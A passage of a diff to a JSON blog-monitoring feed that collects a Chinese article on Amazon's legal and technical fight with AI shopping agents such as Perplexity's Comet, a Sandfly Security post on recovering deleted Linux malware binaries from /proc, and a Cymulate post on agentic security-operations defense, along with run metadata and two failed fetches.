agent 不会在 iOS\n应用内部替你浏览网页，而是在云端为你创建一个虚拟浏览器\n。为了让这个远端虚拟浏览器拥有登录身份，应用在提示用户后把临时的登录\nCookie 上传到了云端。\n这场诉讼在 2026 年 8 月 4\n日迎来了转折性进展。美国联邦第九巡回上诉法院作出一项长达 21\n页的重要裁决：\n撤销原审法院针对\nPerplexity 颁布的初步禁令，并将案件发回原审法院继续审理\n。\n我翻到第九巡回法院这份意见书时，发现法官关注的核心其实只有一个：在法律意义上，究竟是谁在发起对\nAmazon 计算机的访问？\n依据当时案卷记录，上诉法院指出，虽然 Perplexity\n的云端系统向本地发送了操作指令，但实际发出访问请求的依然是坐在电脑前、借助辅助工具开展具体操作的消费者本人。法官在意见书第\n15 页写道：\n真正访问\nAmazon 计算机的，是借助辅助工具在 Amazon.com\n上执行具体操作的用户本人\n。换句话说，按当时的案卷记录，是消费者本人借助工具访问了\nAmazon 的计算机，法院在这份记录上并没有把 Perplexity\n认定为法律意义上的访问者。\n不过，必须讲清楚的是，撤销初步禁令不等于 Perplexity\n赢下了整场官司，更不代表本地工具就拥有不受限制的合法通行权。上诉法院法官在判决附注中作出了严格保留。意见书第\n21 页第 5 条附注明确写道：\n这一结果并不妨碍\nAmazon 通过面向用户的私有服务条款来规范对 Amazon.com\n的访问\n。这项裁决丝毫不会削弱 Amazon\n依据自身服务条款去约束其用户的权利。法院既没有判定所有本地运行的辅助工具都合法，也没有否定平台通过私人契约管理商城的权力，更没有对案件中诸如经济损失等其他法律要件作出终局认定。\n随后，进攻方的火力点迅速发生了转移。2026 年 9 月 21 日，\nAmazon\n正式向法院提交了修订后的新诉状\n。在这份新诉状里，Amazon\n调整了诉讼策略。除了继续坚持原有的反黑客法诉求外，Amazon\n新增了一项民事侵权指控：故意干预合同关系（Tortious Interference with\nContractual Relations）。Amazon 指控 Perplexity\n故意诱导并协助用户规避和违反他们此前同意的网站使用条款。\n同时，Amazon 把目光重点转向了 Comet 在移动端的做法。针对 MacStories\n记录的 iOS 云端虚拟浏览器，Amazon\n主张这种由云端服务器直接连接商城的行为属于未经授权的直连。此外，诉状还指控\nPerplexity 在 2025\n年经历两轮技术封锁后故意更新软件绕过防御。目前，这些新指控尚未经过法庭审理。\n从这份 8 月的法庭裁决和 9\n月的新诉状中，我们可以清楚地看出法律风险是如何随着系统架构而分叉的：如果是本地执行架构，由本地浏览器出面操作，那么在反黑客法（CFAA）关于未授权计算机访问的指控上，厂商承受的法律压力明显减轻。因为法庭目前更倾向于认定这是消费者借助工具访问，而非外部黑客程序直接入侵。但这不代表没有法律风险，用户违反平台服务条款的违约责任，以及厂商面临的诱导违约侵权指控，依然是悬在头顶的现实风险。\n如果退回云端直连架构，由厂商的机房服务器或云端虚拟浏览器直接访问商城，平台立刻就能重新抓住未授权机房直接连入这一点，在反黑客法上组织起全新的攻击面。此前行业讨论的从云端退回用户客户端，在法律层面到底带来了什么改变、又留下了什么隐患，在这两份法律文件中有了清晰的回答。\n广告是卖给真人看的\n在法庭诉讼和条款争议之外，平台心里其实还有一笔经济账。很多人以为电商平台拦截跑腿软件，是担心外部程序抢走订单。但从交易本身来看，有人替顾客下单，买卖照旧发生，平台同样能拿到商品价差或者商家的销售佣金，成交环节的损失其实有限。\n平台真正受损的地方，在搜索和浏览背后的广告收入。商家在电商网站上花钱购买搜索排名和推荐橱窗，买的是活生生的人类注意力。我翻看\nAmazon\n2025\n年的年度报告\n，年报写明广告收入按照点击或曝光来计量。广告主愿意付费，是因为广告能吸引真人、影响真人的购买决定，进而促成点击。\nAI\n助手的浏览方式却完全不同。如果你让它去挑选二十个商品页，它会在短时间内打开大量页面，却不会受广告影响。从技术逻辑推演，自动化程序在解析页面代码时，能够分清哪个是广告位、哪个是自然搜索结果。当然，agent\n能分辨广告位属于分析推演，并不是 Amazon\n官方公布的实测数据。面对这些页面，AI\n只抽取商品价格、规格参数和买家评价，完全避开花钱推广的内容。\n这就带来了一个让平台头疼的局面：这些页面原本能向真人展示广告、赚取点击费，而\nagent\n的浏览把广告赖以成立的那个注意力环节拿掉了。按这个推演，外部助手在免费消耗商城的浏览页面，页面本身的广告价值却很难兑现。这也是平台必须在浏览层防范外部流量的核心动机。\n不过，评估这笔损失也要看清体量。Amazon 2025\n年年报显示，公司全年总净营收约 7170 亿美元，其中广告服务收入约 686\n亿美元，占比不到一成。广告虽然增速较快，但不是平台的营收大头。AI\n浏览冲击的是依附在商品展示上的广告层，并不是整个商业模式。\n平台既想守住展示页面的广告价值，又不能把接入 AI\n的趋势挡在门外。这种复杂的经济考量，直接解释了为什么各大巨头在技术上严加防守的同时，又悄悄坐到了同一张谈判桌前。\n同一个商品页，人看到广告会被影响，机器只抽取参数。\n为什么一边封锁，一边合作\n如果只看商城前端的技术封锁与法庭诉讼，各大科技公司似乎水火不容。但在商业标准的制定现场，展现出的却是另一番景象。\n2026 年 4 月 24 日，协议参与方宣布，\nAmazon、Meta、微软、Salesforce\n与 Stripe 共同加入了通用商业协议 UCP 技术委员会\n。在\nUCP\n这个开放协议\n中，各方共同坐下来讨论通用的商品发现、购物车管理与结账流程规范。在此之前的\n1 月，\nGoogle\n也联合 Shopify、Target、Walmart 等零售巨头推进 UCP\n落地\n，并在协议框架中明确指出零售商保留其作为法定销售方的地位，牢牢把控交易控制权与客户关系。\n4 月份还在共同起草行业标准，到了 9 月份，Amazon 照样在商城里封锁了\nMeta 的\nMuse。这组对比说明：坐在一起商量接口协议，与自家的商场愿不愿意向外部程序开门，完全是两码事。协议解决连接格式，不解决准入许可。参与标准制定不会自动开放商城，平台依然在控制自己的流程，相关的条款效力与法律争议如前文所述仍未定论。\n各大 AI 厂商在具体的落地方式上也在摸索调整。OpenAI\n此前曾尝试让交易留在对话框内，于 2025 年 9 月联合 Stripe 推出 Instant\nCheckout 和 ACP 协议。但在实际运行近半年后，OpenAI 在\n2026\n年 3 月 24\n日做出了调整\n。官方坦言最初的即时结账不够灵活，决定允许商家使用自己的结账流程。官方说明的原话是：\n我们发现第一版\nInstant Checkout\n没有达到我们希望提供的灵活度，因此允许商家使用自己的结账体验，我们则把重心放到商品发现上\n。\n根据\nShopify\n的官方说明\n，如今 ChatGPT\n用户挑好商品后，是通过应用内浏览器进入商家网站完成结账。商家掌控结账流程与用户关系，聊天助手负责前期的寻找与推荐。Google\n的支持文档显示，\nGemini\nSpark 既可以连接用户本地 Chrome\n浏览器复用登录状态，也可以使用远端浏览器环境\n。\n在身份标记上，技术实现同样不等于准入许可。OpenAI 在云端浏览器\n说明文档中介绍\n，系统会用数字签名给外发请求附上可验证的身份，以便目标网站核验请求确实来自\nChatGPT。但这只是证明流量来自谁，网站核验后是放行还是阻断，依然由网站自己决定。自报身份不等于拿到门票。\nAmazon 自身的产品做法也体现了这种控制逻辑。在企业服务领域，Amazon\n推出了\n面向机构采购的业务订购接口\nBusiness Ordering\nAPI\n。但这套接口面向特定合作方，有着严格的准入与授权，是一条限定的企业采购专供通道，不是通用的开放准入。\n而在面向外部商城时，Amazon 自己也在购物应用中推出了\n代办功能\nBuy for Me\n，替用户前往第三方商城采购商品。\nAmazon\n表示其代办请求会自报身份\n，并提供了\n允许商家通过邮件申请退出的机制\n。不过，允许事后退出不代表事先得到同意，\n此前也有独立品牌对商品未经沟通便纳入代办表达了异议\n。\n回到最初买办公椅的场景：技术能把浏览器从机房搬到本地，缩小网络层面的可见差异；算法也可以把操作节奏模拟得越来越像真人；行业协议也能统一数据交互格式。但只要交易发生在他人的商城里，平台依然在控制自己的网站流程、流量和广告收入，相关的条款效力与法律争议仍未定论。决定购物助手能否替人把商品买回家的，不仅在于软件能把网页操作得多熟练，也在于那家店铺在看到有人替顾客跑腿时，究竟愿不愿意把门推开。\n额外来源\n本次事件与双方说法\n-\nThe\nRegister：Amazon 把 Meta 的 Muse\n挡在了门外\n（2026-09-21，记者实测与拦截页截图） -\nGeekWire：Amazon\n封锁 Meta 的 Muse\n（2026-09-20，弹窗警告与 Amazon 单方说明） -\nThe\nVerge：Amazon 拦截 Muse 购物\n（2026-09-21，此前成功买过背心的报道） -\nMeta Muse\n官方安全文档\n（2026-09-08，凭证隔离设计，早于封锁）\n法律文件与独立分析\n-\n第九巡回上诉法院意见书（2026-08-04，21\n页 PDF）\n-\nAmazon\n诉 Perplexity 案卷，含 2026-09-21 修订诉状\n-\nMacStories：iOS\n版 Comet 上手评测\n（2026-03-18，iOS 早期版上手记录） -\nZenity\nLabs：对 Comet 桌面端的独立逆向分析\n财报与行业动作\n-\nAmazon\n2025 年年报\n（广告收入按点击/曝光计量；2025 广告收入约 686 亿美元） -\nUCP\n技术委员会新闻稿\n（2026-04-24）与\nUCP\n项目站\n-\nGoogle：与零售商共建\nagentic commerce\n（2026-01-11）与\nGemini\nSpark 支持文档\n-\nOpenAI：Instant\nCheckout 调整说明\n（2026-03-24）与\nChatGPT\n云端浏览器文档\n-\nShopify：agentic\ncommerce 如何运作\n（2026-06-18） -\nAmazon\nBusiness Ordering API 文档\n、\nBuy\nfor Me 发布说明\n与\n商家退出机制页面\n-\nModern\nRetail：品牌对 Buy for Me 未经沟通收录商品表达异议\n（2026-01-06）\n本站前文\n-\nGoogle\n关掉 Project Mariner，Anthropic 和 OpenAI\n其实也没跑通\n（2026-05-11）",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://yage.ai/share/amazon-ai-shopping-agent-blocking-20260927.html",
-      "content_chars": 7088,
-      "content_sha256": "77d16d01df967af5f26e474c6b686d0b1506382c25c3e722dad3be183dce8bbd",
-      "content_fetched_at": "2026-09-30T00:17:24.470806+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "yage.ai share (Deep News)",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:180da5a8deb045af",
-      "kind": "publish",
-      "text": "sandflysecurity-blog published: How To Recover A Deleted Binary From Active Linux Malware",
-      "actor": "sandflysecurity-blog",
-      "actor_url": "https://sandflysecurity.com/blog",
-      "created_at": "2026-09-28T19:01:16+00:00",
-      "html_url": "https://sandflysecurity.com/blog/how-to-recover-a-deleted-binary-from-active-linux-malware",
-      "title": "How To Recover A Deleted Binary From Active Linux Malware",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "2 min read\nHow To Recover A Deleted Binary From Active Linux Malware\nSandfly Security - Agentless Linux EDR and Incident Response\nSeptember 28, 2026\nRootkits\nMalware\nLinux Security\nLinux Forensics\nOften, Linux malware will delete itself after it starts so that file scanners and integrity checks won’t see the binary present. It also can make forensic analysis harder if you can’t get to the binary easily. However, it is easy to recover a deleted process binary on Linux as long as the process is still in memory. Let’s take a look.\nRecovering a Deleted Linux Process Binary Command\nThe basic command to recover a deleted process binary is simple. Just do the following:\ncp /proc/<PID>/exe /tmp/recovered_bin\nWhere <PID> is the Process ID of the deleted process you want to recover. The above command will copy the binary to\n/tmp/recovered_bin\nso you can do with it what you will.\nPracticing Recovery of a Deleted Process\nWe’re going to use the\nsleep\ncommand to simulate a process that has deleted itself from the disk. You can run this series of command safely on your own Linux system so you can practice recovery of a deleted binary.\ncd /tmp\ncp /bin/sleep x\n./x 3600 &\nrm x\nNow check that the binary is in fact gone:\nls -al /tmp/x\nls: cannot access /tmp/x: No such file or directory\nThe above copies the\nsleep\ncommand as “x” under\n/tmp\nand runs for 3600 seconds and then exits. We then delete “x” so they system binary appears removed.\nYou can see the process still running in the\nps\nlisting below.\nForensics Examination of Linux /proc for a Deleted Process\nNow let’s look at the\n/proc\ndirectory for this process. The\n/proc\nfilesystem is a special filesystem on Linux that tracks almost all kernel and process information you would ever want.\nUnder\n/proc\nthe system flagged the binary as deleted. The command format is:\nls -al /proc/<PID>/exe\nWhere again <PID> is the process ID we’re interested in like so:\nls -al /proc/12725/exe\nlrwxrwxrwx 1 root root 0 May 23 19:39 /proc/12725/exe -> /tmp/x (deleted)\nRecovery of Deleted Linux Process\nBut, the Linux file system will not actually delete that file\nas long as a running process still has it open\n. The file is there, but it simply is not being shown to you any more.\nThis\n/proc/12725/exe\nlink will easily get you the binary that started the process. Simply copy it to where you want and the binary that was deleted is now yours:\ncp /proc/12725/exe /tmp/recovered_bin\nThe hashes of the recovered binary and the\nsleep\ncommand that we used to emulate the attack are identical which proves the file recovered correctly.\nsha1sum /tmp/recovered_bin\nd76373f39b93bbc5191e5f8ca0f9c2f692e5aa71 /tmp/recovered_bin\nsha1sum /bin/sleep\nd76373f39b93bbc5191e5f8ca0f9c2f692e5aa71 /bin/sleep\nYou can now use this binary for further analysis as you wish such as a quick look with\nstrings\nor disassembler of your choice.\nNever Kill a Suspicious Process Blindly\nThe above is reason 4,387 to never simply kill a suspicious process you find until you have\nthoroughly investigated what is going on\n. If you were to kill the process first,\nyou’d lose the binary as it would be released by the filesystem and likely destroyed\n.\nIf a system is infected with something, isolate it on the network and then take your time and look around. Do not go in with guns blazing because you will destroy critical data.\nAs we advise in the\nLinux command line forensics cheat sheet\n:\nDon’t Panic\n. Take your time, collect your evidence, and only then rebuild the system after you’ve figured out what is going on and how the attack happened (root cause analysis). What’s the point of rebuilding a box if you don’t know how the person entered and whether they’ll just do the same thing again immediately when you bring it back online?\nFinally, did you know that Sandfly’s agentless Linux security platform automatically hunts for deleted processes and grabs forensic data about the situation for you?\nWhy not give it a try?\nTweet\n1 min read\nBasic Linux Malware Process Forensics for Incident Responders\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nSep 29, 2026, 7:58:25 AM\nPublication date: 30 September 2019\nRootkits\nMalware\nLinux Security\nLinux Forensics\nRead More\n1 min read\nDetecting Linux Binary File Poisoning\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nSep 29, 2026, 7:58:58 AM\nPublication Date: 13 June 2018\nRootkits\nMalware\nLinux Security\nLinux Forensics\nRead More\n1 min read\nLinux Scales eBPF Rootkit Detection and Analysis\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nSep 29, 2026, 8:00:31 AM\nSandfly Blog Linux Scales eBPF Rootkit Detection and Analysis 24 June 2026 Rootkits\nRootkits\nMalware\nLinux Forensics\nRead More",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://sandflysecurity.com/blog/how-to-recover-a-deleted-binary-from-active-linux-malware",
-      "content_chars": 4698,
-      "content_sha256": "ef296e64a7c2c1b82184a4085d4e3dd28880adcd863fbaf5bffac09c28dce365",
-      "content_fetched_at": "2026-09-30T00:17:55.956716+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "Sandfly Security Blog",
-      "fetch_status": "ok",
-      "url_corrected": false
-    },
-    {
-      "id": "a:e23a49faa4887d9a",
-      "kind": "publish",
-      "text": "sandflysecurity-blog published: Free Sandfly Linux Incident Response License",
-      "actor": "sandflysecurity-blog",
-      "actor_url": "https://sandflysecurity.com/blog",
-      "created_at": "2026-09-28T19:01:11+00:00",
-      "html_url": "https://sandflysecurity.com/blog/free-sandfly-linux-incident-response-license",
-      "title": "Free Sandfly Linux Incident Response License",
-      "via": "rss",
-      "collect_mode": "rss",
-      "content": "1 min read\nFree Sandfly Linux Incident Response License\nSandfly Security - Agentless Linux EDR and Incident Response\nSeptember 28, 2026\nLinux Security\nLinux Forensics\nSandfly is offering free licenses for incident response teams.\nSandfly's agentless deployment on Linux makes it compatible, fast, and safe giving it unparalleled capability for incident response. Our free license allows teams to get help immediately during an incident.\nGet your free license here:\nFree Linux Incident Response License\nSandfly investigates Linux systems in seconds and the free license allows security teams to:\nDeploy our extensive compromise tactics detection.\nUse our agentless password auditor to find high risk accounts.\nLeverage our SSH Hunter to find, track, and audit SSH keys, who is using them, where they are being used, and much more.\nUtilize drift detection to find systems that are using unknown processes, users, scheduled tasks, files, and other unauthorized changes.\nBuild custom detection modules to do tailored threat hunting.\nInvestigate privately and discreetly as no data is ever sent to Sandfly or any third-party.\nDealing with an incident can be stressful, especially when many different versions and configurations of Linux are in play. Let Sandfly do the investigation and get answers in seconds. Reach out today with any questions. We are here to help.\nTweet\n1 min read\nLinux Hacked | Linux Hacking | Christchurch Hacker Con 2017 Linux Forensics Slides\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nMay 29, 2018, 7:00:00 AM\nPublication Date: 29 May 2018\nLinux Security\nLinux Forensics\nPresentations\nRead More\n1 min read\nDetecting Linux Kernel Process Masquerading with Command Line Forensics\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nMar 30, 2020, 8:00:00 AM\nPublication Date: 30 March 2020\nRootkits\nMalware\nLinux Security\nLinux Forensics\nRead More\n1 min read\nUsing Command Line Tools to Find Process Masquerading Linux Malware\nSandfly Security - Agentless Linux EDR and Incident Response\n:\nFeb 27, 2019, 8:00:00 AM\nP u blication Date: 27 February 2019\nRootkits\nMalware\nLinux Security\nLinux Forensics\nRead More",
-      "content_format": "text/plain",
-      "content_status": "ok",
-      "content_via": "http",
-      "content_source_url": "https://sandflysecurity.com/blog/free-sandfly-linux-incident-response-license",
-      "content_chars": 2158,
-      "content_sha256": "b989add8705e122b1267d258d4c42f4c5e818ed03440fee1966c104ac930e28b",
-      "content_fetched_at": "2026-09-30T00:17:56.049546+00:00",
-      "content_error": "",
-      "time_precision": "exact",
-      "source_name": "Sandfly Security Blog",
-      "fetch_status": "ok",
-      "url_corrected": false
-    }
-  ],
-  "summary": {
+  "source_id": "blog_watch",
+  "collect_date": "2026-09-30",
+  "collect_window": {
+    "start": "2026-09-28T19:01:11+00:00",
+    "end": "2026-09-30T00:16:27.541665+00:00",
+    "hours": 29
+  },
+  "producer": {
+    "name": "sentinel-site",
+    "version": "0.1.0",
+    "run_id": "36649497665",
+    "commit": "42eae44"
+  },
+  "stats": {
+    "total": 13,
     "by_kind": {
       "publish": 13
     },
@@ -351,9 +32,1031 @@
       "yage-share": 2,
       "sandflysecurity-blog": 2
     },
+    "failed_lists": [],
+    "sources_ok": 53,
+    "sources_failed": [],
+    "baselines": 0,
+    "via_sources": {
+      "llm": 12,
+      "browser_llm": 10,
+      "rss": 31
+    },
+    "llm_usage": {
+      "model": "deepseek-v4-flash",
+      "requests": 16,
+      "calls": 16,
+      "prompt_tokens": 17710,
+      "completion_tokens": 8585,
+      "total_tokens": 26295,
+      "prompt_cache_hit_tokens": 10365,
+      "prompt_cache_miss_tokens": 7345
+    },
     "by_content_status": {
       "failed": 6,
       "ok": 7
     }
-  }
+  },
+  "items": [
+    {
+      "id": "a:2d23b3edbe4902b8",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+      "at": "2026-09-30T00:16:27.541665+00:00",
+      "external_id": "a:2d23b3edbe4902b8",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+      "content": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-09-30T00:17:03.660361+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-09-30T00:16:27.541665+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/773326-ai-post4814284.html",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:bd5b469d26717bc3",
+      "who": "unknowncheats-ac",
+      "who_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "action": "publish",
+      "target": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+      "target_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+      "text": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+      "at": "2026-09-30T00:16:27.541665+00:00",
+      "external_id": "a:bd5b469d26717bc3",
+      "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+      "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+      "content": "unknowncheats-ac published: https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+      "content_format": "text/plain",
+      "content_status": "failed",
+      "content_via": "",
+      "content_source_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+      "content_chars": 0,
+      "content_sha256": "",
+      "content_fetched_at": "2026-09-30T00:17:14.629270+00:00",
+      "author": "unknowncheats-ac",
+      "author_name": "UnknownCheats Anti-Cheat",
+      "author_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+      "published_at": "2026-09-30T00:16:27.541665+00:00",
+      "collected_at": "2026-09-30T00:16:27.541665+00:00",
+      "tags": [
+        "kind:publish",
+        "src:unknowncheats-ac",
+        "via:browser_llm",
+        "channel:browser_llm"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/",
+        "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "unknowncheats-ac",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "unknowncheats-ac",
+          "name": "UnknownCheats Anti-Cheat",
+          "home_url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/"
+        },
+        "article": {
+          "title": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+          "url": "https://www.unknowncheats.me/forum/general-programming-and-reversing/742915-advanced-hwid-spoofer-post4813843.html",
+          "content_sha256": ""
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "browser_llm",
+        "collect_mode": "browser_llm",
+        "time_precision": "daily_window",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "blocked",
+        "content_status": "failed",
+        "content_via": ""
+      }
+    },
+    {
+      "id": "a:726033a757489fcb",
+      "who": "cymulate-blog",
+      "who_url": "https://cymulate.com/blog/",
+      "action": "publish",
+      "target": "Operationalizing Agentic Cyber Defense Engineering for SecOpsRead More",
+      "target_url": "https://cymulate.com/blog/agentic-cyber-defense-secops/",
+      "text": "cymulate-blog published: Operationalizing Agentic Cyber Defense Engineering for SecOpsRead More",
+      "at": "2026-09-30T00:16:27.541665+00:00",
+      "external_id": "a:726033a757489fcb",
+      "url": "https://cymulate.com/blog/agentic-cyber-defense-secops/",
+      "title": "Operationalizing Agentic Cyber Defense Engineering for SecOpsRead More",
+      "content": "Operationalizing Agentic Cyber Defense Engineering for SecOps\nBy:\nAmanda Kegley\nSeptember 29, 2026\nSecurity operations teams spend too much of each day gathering context, configuring assessments, correlating evidence and coordinating follow-up actions across disconnected tools and processes.\nAgentic cyber defense engineering is designed to streamline this work by coordinating specialized agents through continuous, governed routines. Previous blogs in this series defined the\narchitecture\nand\nrequirements\nbehind the operating model. This blog shows how that model applies to three recurring SecOps workflows: validating new threats and verifying mitigation, turning exposures into informed defensive action and continuously engineering detection coverage.\nKey takeaways\nThreat validation should end with proven mitigation\n. Agents can determine whether a threat is relevant, validate defenses, deploy fixes and trigger revalidation to verify successful mitigation.\nExposure data becomes more valuable when it informs defense\n. Validated exploitability, attack paths and control performance help SecOps teams prioritize their actual risk and improve threat resilience.\nDetection engineering can become continuous\n. Agents can build coverage for new threats and exposures, test rules against realistic behavior and identify drift before an attacker exploits it.\nCommon Operational Use Cases and Routines\nAgentic cyber defense engineering supports a wide range of SecOps activities with repeatable, continuous routines. In most cases, these start with a common trigger – a new threat, a new exposure or a coverage gap – then coordinates the steps teams usually do by hand: gather the right context, run production-safe validation, correlate results across controls and drive the next action until the outcome is verified.\nRoutine: From new threat to verified mitigation\nSecOps teams must continually monitor threat intelligence, determine which threats are relevant and validate whether existing defenses are preventing and detecting, as intended. Manually reviewing new campaigns, finding applicable attack scenarios and configuring assessments can delay answers while threats continue to evolve.\nAgentic cyber defense engineering automates this workflow through a recurring threat-validation routine. Agents monitor selected CERTs, commercial threat feeds and internal intelligence sources for new campaigns, malware and attacker techniques. They deduplicate new items and compare them with the organization’s assets, technologies and threat profile to determine relevance.\nFor relevant threats, specialized agents select applicable attack scenarios or draft new ones when validation content does not exist. Then, they configure and safely execute the assessment, correlate the attack activity with prevention and detection controls and identify which behaviors were blocked, detected or missed. When fixes for security gaps are implemented, agents then verify successful mitigation.\nAs threat intelligence or the organization’s environment changes, agents continually monitor and report changes in defensive performance, allowing SecOps to track resilience against the threat over time.\nRoutine: From exposure to exposure-informed defenses\nWhen a new CVE or exposure is identified, SecOps teams must quickly determine whether affected technology is present, whether the vulnerability is exploitable in their environment, whether existing controls provide protection and what action is required. Answering those questions often requires analysts to search multiple tools, locate or build a test, configure the assessment and interpret the results.\nWith agentic cyber defense engineering, an analyst can initiate the process with plain text, such as: “Assess whether our environment is exposed to CVE-XXXX-XXXX.” The system can translate that request into a governed validation routine rather than requiring the analyst to design and coordinate every step manually.\nSpecialized agents can identify potentially affected assets, gather relevant threat and vulnerability context, select an existing attack scenario or draft one for review, and execute the assessment within defined safety policies. The routine can then correlate the results with prevention and detection controls, calculate actual risk scores based on demonstrated exploitability and prioritize for mitigation.\nRoutine: Continuous detection engineering\nSecOps teams struggle to keep pace with evolving threats and verify that their security controls are detecting all relevant attacker activity. Manually creating, tuning and testing detection rules takes significant time, while changes to rules, parsers, telemetry or data sources can cause previously effective detections to fail without warning.\nAgentic cyber defense engineering can coordinate detection validation, assessment analysis and repeatable detection engineering work. Agents can ingest existing detection rules, execute realistic attacks, correlate that activity with SIEM and EDR telemetry and determine whether the expected alerts and detections were generated.\nWhen coverage is missing, agents can deploy new tailored detection rules to security tools. Agents monitor to determine when an existing rule stops firing. Then, agents run a routine to identify the gap and mitigate.\nWhat Changes for SecOps\nAcross all three use cases, agents collect context, configure assessments, correlate evidence and coordinate follow-up actions. Routines make the work repeatable, while two-way integrations connect threat feeds, validation, controls, telemetry and ticketing systems.\nSecOps teams still define policies, scope, approvals and risk thresholds. Analysts investigate ambiguity and make business-risk decisions, while agents advance high-volume, repeatable work within those guardrails.\nSecurity leaders should measure success by the defensive learning cycle, not by the number of AI features or automated tasks. For example, determine how quickly a team can move from a relevant threat or exposure to validated evidence to verified mitigation?\nReady to Put Agentic Cyber Defense Engineering to Work?\nOperationalizing agentic cyber defense engineering means continuously and autonomously connecting intelligence, exposures, validation and security controls into use cases that produce measurable improvement. For SecOps teams, the result is not simply more automation. It is a continuous, evidence-driven way to improve defense while reducing the manual effort required to coordinate every step.\nTo explore the complete operating model,\ndownload the Agentic Cyber Defense Engineering e-book\n. To see how Cymulate can operationalize these use cases across your security program,\nschedule a demo\n.\nAmanda Kegley\nAmanda Kegley has over 15 years of experience in cybersecurity. With her in-depth knowledge of security needs in today’s dynamic threat landscape, she successfully innovates and markets new cybersecurity capabilities.\nMore about Author\nTable of Contents\nCommon Operational Use Cases and Routines\nRoutine: From new threat to verified mitigation\nRoutine: From exposure to exposure-informed defenses\nRoutine: Continuous detection engineering\nWhat Changes for SecOps\nReady to Put Agentic Cyber Defense Engineering to Work?\nCymulate Exposure Validation\nmakes advanced security testing fast and easy. When it comes to building custom attack chains, it's all right in front of you in one place.\nMike Humbert\n,\nCybersecurity Engineer\nDARLING INGREDIENTS INC.\nLearn More\nFeatured Resources\nView More Resources\nblog\nInside the Agentic Cyber Defense Engineering Architecture: How it 